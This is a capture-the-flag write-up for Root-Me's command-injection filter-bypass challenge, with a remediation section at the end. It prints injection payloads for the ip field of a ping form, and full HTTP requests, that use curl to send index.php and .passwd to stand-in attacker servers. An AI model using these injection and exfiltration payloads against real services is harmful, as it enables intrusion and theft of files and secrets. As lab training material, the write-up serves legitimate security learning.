## Root-Me.org Challenge Write-Up: Command Injection - Filter Bypass
`https://www.root-me.org/en/Challenges/Web-Server/Command-injection-Filter-bypass`

**Challenge Description:** This challenge involves a web service that accepts an IP address via a POST request and pings it. The goal is to exploit a command injection vulnerability in this service and retrieve the flag stored in the `index.php` file. Various protections are in place, making it necessary to bypass these filters.

### Step-by-Step Solution

#### Step 1: Initial Interaction

1. **Submit an IP Address**:
   - The webpage provides an input box to enter an IP address.
   - Input a simple IP address, such as `127.0.0.1`, and submit to see the expected behavior. This will send a POST request to the server to ping the provided IP address.

#### Step 2: Analyzing Server Response

1. **Capture the Request**:
   - Use a tool like Burp Suite to capture the HTTP request sent when the IP address is submitted.
   - This helps in understanding the structure of the request and how the server processes it.

2. **Inspect the Response**:
   - Check the server's response to understand how it handles the ping command.
   - Typically, a successful ping will result in a "Ping OK" message, while a failed attempt will result in "Ping NOK".

#### Step 3: Identifying Potential Injection Points

1. **Attempt Basic Injection**:
   - Try injecting a simple command to see if the server is vulnerable.
   - For example, submit `127.0.0.1; ls` and check the response. If the server is vulnerable, it may include the output of the `ls` command.

2. **Analyze the Injection Point**:
   - If the basic injection works, note that the server is vulnerable to command injection.

#### Step 4: Crafting a Payload to Bypass Filters

1. **Bypass Basic Filters**:
   - The server may have basic filters to prevent command injection. Commonly filtered characters include `;`, `|`, `&`, and newline characters.
   - Use URL encoding to bypass these filters. For example, `%0a` represents a newline character in URL encoding.

2. **Constructing a Malicious Payload**:
   - Use a payload that reads the content of the `index.php` file and sends it to an external server you control.
   - Example payload: `127.0.0.1;%0a$(curl -d @index.php https://your-server.com)`

#### Step 5: Using Burp Suite to Send the Payload

1. **Intercepting the Request**:
   - Open Burp Suite and ensure Intercept is on.
   - Submit a dummy IP address in the form to capture the request.

2. **Modifying the Request**:
   - In Burp Suite, find the intercepted request and send it to the Repeater.
   - Modify the `ip` parameter to include the injection payload:
     ```plaintext
     ip=127.0.0.1;%0acurl -d @index.php https://your-server.com
     ```

3. **Send the Request**:
   - Click "Send" in the Repeater tab.
   - Check your external server for incoming requests containing the contents of `index.php`.

### Detailed Exploit Example

**Request in Burp Suite**:
```plaintext
POST /web-serveur/ch53/index.php HTTP/1.1
Host: challenge01.root-me.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 75

ip=127.0.0.1;%0acurl -d @index.php https://your-requestbin-url.com
```

### Understanding the Results

After sending the request, check your request capture service (like RequestBin). You should see a request containing the contents of `index.php`. This file includes the code of the webpage, revealing any other potential vulnerabilities or important information like the flag.

**Example Captured Data**:
```plaintext
<?php
// Content of index.php
$flag = "".file_get_contents(".passwd")."";
...
?>
```

From this, you can infer that the flag is stored in a file named `.passwd`.

### Retrieving the Flag

1. **Crafting the Final Payload**:
   - Now that you know the flag is in `.passwd`, modify your payload to read this file.
   - Example payload: `127.0.0.1;%0acurl -d @.passwd https://your-server.com`

2. **Send the Modified Payload**:
   - Intercept and modify the request as previously described, this time with the new payload to read `.passwd`.

**Modified Request**:
```plaintext
POST /web-serveur/ch53/index.php HTTP/1.1
Host: challenge01.root-me.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 74

ip=127.0.0.1;%0acurl -d @.passwd https://your-requestbin-url.com
```

### Understanding the Results

Check your request capture service again. You should now see a request containing the contents of `.passwd`, which includes the flag.

**Example Captured Data**:
```plaintext
flag{example_flag_content}
```

### Remediation

To prevent this vulnerability, the application should:

1. **Use Parameterized Commands**: Avoid directly including user inputs in shell commands. Use parameterized commands or safer alternatives.
2. **Strict Input Validation**: Implement comprehensive validation to ensure only valid IP addresses are accepted.
3. **Escape User Inputs**: Properly escape any user input if it must be included in shell commands.

### Key Takeaways

- **Command Injection**: Command injection vulnerabilities can be exploited by carefully crafting inputs that manipulate the command execution flow.
- **Filter Bypass**: Simple filters can often be bypassed using less common characters or encoding techniques.
- **Request Interception and Modification**: Tools like Burp Suite are essential for testing and exploiting web vulnerabilities.
- **External Data Exfiltration**: Using tools like `curl` to send data to an external server can help in capturing and analyzing sensitive information.

This write-up provides a comprehensive approach to understanding and solving the "Command Injection - Filter Bypass" challenge on Root-Me.org. 
